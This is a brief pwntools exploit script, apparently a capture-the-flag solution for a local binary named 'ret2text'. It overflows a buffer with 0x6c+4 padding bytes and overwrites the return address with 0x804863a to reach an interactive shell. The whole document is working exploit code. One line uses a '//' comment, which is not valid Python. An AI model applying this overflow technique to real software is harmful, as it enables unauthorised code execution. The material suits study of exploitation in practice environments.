from pwn import *
sh = process('./ret2text')
target = 0x804863a
//sh.sendline('A' * (0x6c+4) + p32(target))
sh.sendline('A' * (0x6c+4) + '\x3a\x86\x04\x08')
sh.interactive()
